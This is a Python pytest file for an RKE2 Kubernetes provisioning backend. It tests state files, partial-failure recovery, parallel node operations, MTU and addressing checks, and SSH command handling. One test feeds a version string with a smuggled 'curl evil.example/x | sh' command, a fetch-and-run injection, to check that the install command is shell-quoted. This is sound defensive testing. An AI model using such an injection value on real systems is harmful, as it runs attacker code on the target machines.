"""Tests for RKE2Backend logic that doesn't need a real machine: state
persistence, partial-failure tracking, the parallel helper, and command
construction. Anything that would shell out is monkeypatched out."""
import os
import shlex
import stat
import subprocess

import pytest

from multistack import RKE2Cluster, RKE2Node
from multistack.backends.rke2_client import (
    ClusterState,
    RKE2Backend,
    RKE2Error,
    RKE2PrerequisiteError,
)


@pytest.fixture
def backend(tmp_path):
    """A backend with state isolated to a temp dir and fast polling."""
    return RKE2Backend(state_dir=str(tmp_path / "state"), poll_interval=0, poll_timeout=1)


def stub_out_provisioning(backend, monkeypatch, failing_agents=()):
    """Replaces everything that would shell out with a no-op, so
    create()/update() can run in-process. Agents whose address is in
    `failing_agents` raise instead of joining."""
    monkeypatch.setattr(backend, "check_prerequisites", lambda *a, **k: [])
    monkeypatch.setattr(backend, "_bootstrap_server", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_wait_for_node_token", lambda node: None)
    monkeypatch.setattr(backend, "_fetch_kubeconfig", lambda node: "fake-kubeconfig")
    monkeypatch.setattr(backend, "_write_kubeconfig_file", lambda path, kubeconfig: None)

    def fake_bootstrap_agent(node, token, version, first_server, pin_node_ip=True):
        if node.address in failing_agents:
            raise RuntimeError(f"simulated join failure on {node.address}")

    monkeypatch.setattr(backend, "_bootstrap_agent", fake_bootstrap_agent)


def three_node_cluster(name):
    return RKE2Cluster(
        name=name,
        nodes=[
            RKE2Node(address="server-1", role="server"),
            RKE2Node(address="agent-good", role="agent"),
            RKE2Node(address="agent-bad", role="agent"),
        ],
    )


# -- state persistence ---------------------------------------------------
def test_cluster_state_json_roundtrip():
    state = ClusterState(
        name="rt",
        version="v1.33.1+rke2r1",
        token="tok",
        first_server_address="10.0.0.1",
        kubeconfig_path="/tmp/kc.yaml",
        cni="cilium",
        disable_kube_proxy=True,
        nodes=[RKE2Node(address="10.0.0.1", role="server", ssh_port=2222)],
    )

    restored = ClusterState.from_json(state.to_json())

    assert restored == state
    assert restored.nodes[0].ssh_port == 2222


def test_state_file_is_owner_readable_only(backend):
    # The state file holds the cluster join token.
    backend._save_state(
        ClusterState(
            name="perms",
            version="v1",
            token="secret-token",
            first_server_address="10.0.0.1",
            kubeconfig_path=None,
        )
    )

    assert stat.S_IMODE(os.stat(backend._state_path("perms")).st_mode) == 0o600


def test_kubeconfig_file_is_owner_readable_only(backend, tmp_path):
    # The kubeconfig holds cluster-admin credentials.
    path = tmp_path / "kubeconfig.yaml"

    backend._write_kubeconfig_file(str(path), "fake-kubeconfig")

    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600


# -- partial-failure state tracking --------------------------------------
def test_create_records_nodes_that_succeeded_before_a_failure(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))

    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("partial"))

    # State must survive the failure — otherwise the nodes that did join
    # are stranded: update() can't reach them and delete() refuses to run.
    state = backend._load_state("partial")
    assert state is not None
    assert {n.address for n in state.nodes} == {"server-1", "agent-good"}


def test_delete_cleans_up_after_a_partial_create(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))
    torn_down = []
    monkeypatch.setattr(backend, "_teardown_node", lambda node: torn_down.append(node.address))

    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("partial-delete"))
    backend.delete("partial-delete")

    assert set(torn_down) == {"server-1", "agent-good"}
    assert backend._load_state("partial-delete") is None


def test_update_resumes_a_partial_create(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))
    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("resume"))

    # Retry with the previously-failing node now healthy.
    stub_out_provisioning(backend, monkeypatch)
    backend.update(three_node_cluster("resume"))

    state = backend._load_state("resume")
    assert {n.address for n in state.nodes} == {"server-1", "agent-good", "agent-bad"}


def test_update_removes_nodes_dropped_from_the_spec(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch)
    torn_down = []
    monkeypatch.setattr(backend, "_teardown_node", lambda node: torn_down.append(node.address))
    backend.create(three_node_cluster("shrink"))

    backend.update(
        RKE2Cluster(
            name="shrink",
            nodes=[
                RKE2Node(address="server-1", role="server"),
                RKE2Node(address="agent-good", role="agent"),
            ],
        )
    )

    assert torn_down == ["agent-bad"]
    assert {n.address for n in backend._load_state("shrink").nodes} == {"server-1", "agent-good"}


def test_create_refuses_when_state_already_exists(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch)
    cluster = RKE2Cluster(name="twice", nodes=[RKE2Node(address="server-1", role="server")])
    backend.create(cluster)

    with pytest.raises(RKE2Error, match="already has state"):
        backend.create(cluster)


# -- parallel execution --------------------------------------------------
def test_run_parallel_returns_results_and_fires_on_success(backend):
    nodes = [RKE2Node(address=f"10.0.0.{i}") for i in range(1, 4)]
    seen = []

    results = backend._run_parallel(
        nodes,
        lambda node: node.address.upper(),
        label="test",
        on_success=lambda node, result: seen.append((node.address, result)),
    )

    assert results == {n.address: n.address.upper() for n in nodes}
    assert sorted(seen) == sorted((n.address, n.address.upper()) for n in nodes)


def test_run_parallel_reports_every_failure_not_just_the_first(backend):
    def fn(node):
        if node.address.startswith("bad"):
            raise RuntimeError("boom")
        return "fine"

    nodes = [RKE2Node(address="ok"), RKE2Node(address="bad-1"), RKE2Node(address="bad-2")]
    with pytest.raises(RKE2Error) as excinfo:
        backend._run_parallel(nodes, fn, label="test")

    message = str(excinfo.value)
    assert "2 node(s)" in message
    assert "bad-1" in message and "bad-2" in message


def test_run_parallel_preserves_prerequisite_error_type(backend):
    # Callers distinguish a prerequisite problem from a provisioning one.
    def fn(node):
        raise RKE2PrerequisiteError("not enough RAM")

    with pytest.raises(RKE2PrerequisiteError):
        backend._run_parallel([RKE2Node(address="10.0.0.1")], fn, label="test")


def test_run_parallel_fires_on_success_for_nodes_that_worked(backend):
    seen = []

    def fn(node):
        if node.address == "bad":
            raise RuntimeError("boom")

    with pytest.raises(RKE2Error):
        backend._run_parallel(
            [RKE2Node(address="ok"), RKE2Node(address="bad")],
            fn,
            label="test",
            on_success=lambda node, _result: seen.append(node.address),
        )

    assert seen == ["ok"]


# -- prerequisite arithmetic ---------------------------------------------
@pytest.mark.parametrize("server_count", [2, 4, 6])
def test_even_server_count_warns(backend, server_count):
    nodes = [RKE2Node(address=f"s{i}", role="server") for i in range(server_count)]
    assert "even number of server nodes" in backend._server_count_warning(nodes)


@pytest.mark.parametrize("server_count", [1, 3, 5])
def test_odd_server_count_does_not_warn(backend, server_count):
    nodes = [RKE2Node(address=f"s{i}", role="server") for i in range(server_count)]
    assert backend._server_count_warning(nodes) is None


def test_server_count_warning_ignores_agents(backend):
    nodes = [
        RKE2Node(address="s1", role="server"),
        RKE2Node(address="a1", role="agent"),
        RKE2Node(address="a2", role="agent"),
    ]
    assert backend._server_count_warning(nodes) is None


# -- command construction ------------------------------------------------
def test_install_command_shell_quotes_the_version(backend, monkeypatch):
    # `version` is free-form and the install line runs through a real
    # shell, so an unquoted value would be an arbitrary-execution hole.
    captured = []
    monkeypatch.setattr(
        backend, "_run", lambda node, command, check=True: captured.append(command) or ""
    )
    malicious = "v1.33.1+rke2r1; curl evil.example/x | sh"

    backend._install_rke2(RKE2Node(address="10.0.0.1"), role="server", version=malicious)

    assert shlex.quote(malicious) in captured[0]
    # The payload can't terminate the install command and start a new one.
    assert "; curl" not in captured[0].replace(shlex.quote(malicious), "")


def test_is_local_detects_loopback_addresses():
    for address in ("127.0.0.1", "localhost", "::1"):
        assert RKE2Backend._is_local(RKE2Node(address=address))
    assert not RKE2Backend._is_local(RKE2Node(address="10.0.0.1"))


def test_teardown_uses_the_same_uninstall_script_for_agents_as_servers(backend, monkeypatch):
    # RKE2 has no rke2-agent-uninstall.sh (that's a k3s convention). Looking
    # for one meant agents were never actually uninstalled, while delete()
    # reported success and dropped their state.
    ran = []

    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return "/usr/local/bin/rke2-uninstall.sh\n"
        ran.append(command)
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))

    assert "/usr/local/bin/rke2-uninstall.sh" in ran


def test_teardown_finds_the_script_at_alternate_install_paths(backend, monkeypatch):
    ran = []

    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return "/opt/rke2/bin/rke2-uninstall.sh\n"  # read-only fs install
        ran.append(command)
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="server"))

    assert "/opt/rke2/bin/rke2-uninstall.sh" in ran


def test_teardown_refuses_to_claim_success_when_rke2_is_still_installed(backend, monkeypatch):
    # The dangerous case: no script found, but RKE2 present. Reporting
    # success here leaves a live node with no state tracking it.
    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return ""
        if "command -v rke2" in command:
            return "present"
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)

    with pytest.raises(RKE2Error, match="still installed but no uninstall script"):
        backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))


def test_teardown_is_quiet_when_the_node_is_already_clean(backend, monkeypatch):
    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return ""
        if "command -v rke2" in command:
            return "absent"
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))  # no raise


def test_server_config_pins_the_declared_address(backend, monkeypatch):
    # Left to auto-detect, a multi-homed server registers and advertises
    # whichever interface RKE2 picks — which agents on other subnets may not
    # be able to route to, breaking the supervisor tunnel silently.
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_server(
        RKE2Node(address="192.0.2.10", role="server"),
        "tok", "v1", "cilium", False, first_server=None, pin_node_ip=True,
    )

    assert "node-ip: 192.0.2.10" in written["contents"]
    # advertise-address matters separately: it's what the API server hands
    # agents to dial back on.
    assert "advertise-address: 192.0.2.10" in written["contents"]


def test_agent_config_pins_the_declared_address(backend, monkeypatch):
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_agent(
        RKE2Node(address="192.0.2.11", role="agent"),
        "tok", "v1", RKE2Node(address="192.0.2.10", role="server"), True,
    )

    assert "node-ip: 192.0.2.11" in written["contents"]


def test_node_ip_pinning_can_be_disabled(backend, monkeypatch):
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_server(
        RKE2Node(address="192.0.2.10", role="server"),
        "tok", "v1", "cilium", False, first_server=None, pin_node_ip=False,
    )

    assert "node-ip" not in written["contents"]


def test_low_path_mtu_between_nodes_is_flagged(backend, monkeypatch):
    # The failure that looks like anything but a network problem: a tunnel
    # between subnets lowers the path MTU, the CNI still sizes itself from
    # the local interface, and only full-size pod packets get dropped — so
    # connections open and then hang.
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1428)

    warnings = backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=None,
    )

    assert len(warnings) == 1
    assert "path MTU to 10.0.0.1 is only 1428" in warnings[0]
    assert "cilium_mtu=1350" in warnings[0]


def test_standard_path_mtu_produces_no_warning(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1500)

    assert backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=None,
    ) == []


def test_low_path_mtu_is_accepted_once_cilium_mtu_fits(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1428)

    assert backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=1350,
    ) == []


def test_unmeasurable_path_mtu_is_reported_rather_than_assumed_fine(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: None)

    warnings = backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=None,
    )

    assert any("couldn't measure the path MTU" in w for w in warnings)


def test_mtu_check_skipped_for_non_tunnelled_cni_and_single_node(backend, monkeypatch):
    monkeypatch.setattr(
        backend, "_measure_path_mtu", lambda node, target: pytest.fail("should not probe")
    )
    nodes = [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")]

    assert backend._check_pod_network_mtu(nodes, cni="none", cilium_mtu=None) == []
    assert backend._check_pod_network_mtu(nodes[:1], cni="cilium", cilium_mtu=None) == []


def test_cilium_chart_config_carries_mtu_and_kube_proxy_settings(backend, monkeypatch):
    ran = []
    monkeypatch.setattr(backend, "_run", lambda node, cmd, **kw: ran.append(cmd) or "")

    backend._write_cilium_chart_config(
        RKE2Node(address="10.0.0.1"), disable_kube_proxy=True, cilium_mtu=1350
    )

    manifest = "\n".join(ran)
    assert "MTU: 1350" in manifest
    assert "kubeProxyReplacement: true" in manifest


def test_cilium_chart_config_omits_kube_proxy_block_when_not_requested(backend, monkeypatch):
    ran = []
    monkeypatch.setattr(backend, "_run", lambda node, cmd, **kw: ran.append(cmd) or "")

    backend._write_cilium_chart_config(
        RKE2Node(address="10.0.0.1"), disable_kube_proxy=False, cilium_mtu=1350
    )

    manifest = "\n".join(ran)
    assert "MTU: 1350" in manifest
    assert "kubeProxyReplacement" not in manifest


def test_multi_homed_node_is_flagged(backend, monkeypatch):
    monkeypatch.setattr(
        backend, "_probe", lambda node, cmd, what: "192.0.2.10\n10.0.1.108"
    )

    warnings = backend._check_node_addressing(RKE2Node(address="192.0.2.10"))

    assert any("multi-homed" in w and "10.0.1.108" in w for w in warnings)


def test_single_homed_node_is_not_flagged(backend, monkeypatch):
    monkeypatch.setattr(backend, "_probe", lambda node, cmd, what: "192.0.2.10")

    assert backend._check_node_addressing(RKE2Node(address="192.0.2.10")) == []


def test_declared_address_absent_from_the_node_is_flagged(backend, monkeypatch):
    monkeypatch.setattr(backend, "_probe", lambda node, cmd, what: "10.0.1.108")

    warnings = backend._check_node_addressing(RKE2Node(address="203.0.113.7"))

    assert any("isn't on any interface" in w for w in warnings)


def test_ssh_uses_batch_mode_so_a_bad_key_cant_hang_on_a_password_prompt(backend):
    # Without BatchMode, ssh falls back to an interactive password prompt
    # it reads from the TTY, and the call blocks forever in a worker thread.
    args = backend._ssh_base_args(RKE2Node(address="10.0.0.1"))

    assert "BatchMode=yes" in args


def test_run_reports_a_timeout_instead_of_hanging(backend, monkeypatch):
    def fake_run(*a, **kwargs):
        raise subprocess.TimeoutExpired(cmd="hostname", timeout=kwargs.get("timeout"))

    monkeypatch.setattr(subprocess, "run", fake_run)

    with pytest.raises(RKE2Error, match="timed out"):
        backend._run(RKE2Node(address="10.0.0.1"), "hostname")


def test_run_closes_stdin_and_passes_a_timeout(backend, monkeypatch):
    captured = {}

    def fake_run(argv, **kwargs):
        captured.update(kwargs)
        return subprocess.CompletedProcess(argv, 0, stdout="ok", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    backend._run(RKE2Node(address="10.0.0.1"), "hostname")

    assert captured["stdin"] is subprocess.DEVNULL
    assert captured["timeout"] == backend.command_timeout


def test_publickey_failure_hint_points_at_authorized_keys(backend, monkeypatch):
    def fake_run(argv, **kwargs):
        return subprocess.CompletedProcess(
            argv, 255, stdout="", stderr="agan@host: Permission denied (publickey,password)."
        )

    monkeypatch.setattr(subprocess, "run", fake_run)

    with pytest.raises(RKE2Error, match="authorized_keys"):
        backend._run(RKE2Node(address="10.0.0.1", user="agan"), "hostname")


def test_kubeconfig_is_written_before_agents_join(backend, monkeypatch, tmp_path):
    """The API server is up as soon as the first server is, and joining the
    rest can take minutes. Writing the kubeconfig only at the end left no
    way to watch nodes register except ssh-ing to the server and using
    /etc/rancher/rke2/rke2.yaml by hand."""
    kubeconfig_path = tmp_path / "kc.yaml"
    seen_when_agent_joined = {}

    monkeypatch.setattr(backend, "_bootstrap_server", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_wait_for_node_token", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_fetch_kubeconfig", lambda *a, **k: "apiVersion: v1\n")
    monkeypatch.setattr(backend, "check_prerequisites", lambda *a, **k: [])

    def fake_agent(node, *a, **k):
        seen_when_agent_joined[node.address] = kubeconfig_path.exists()

    monkeypatch.setattr(backend, "_bootstrap_agent", fake_agent)

    backend.create(RKE2Cluster(
        name="early-kubeconfig",
        kubeconfig_path=str(kubeconfig_path),
        nodes=[
            RKE2Node(address="10.0.0.1", role="server"),
            RKE2Node(address="10.0.0.2", role="agent"),
            RKE2Node(address="10.0.0.3", role="agent"),
        ],
    ))

    assert seen_when_agent_joined == {"10.0.0.2": True, "10.0.0.3": True}, (
        "kubeconfig should already be on disk while agents are still joining"
    )
    assert kubeconfig_path.read_text() == "apiVersion: v1\n"
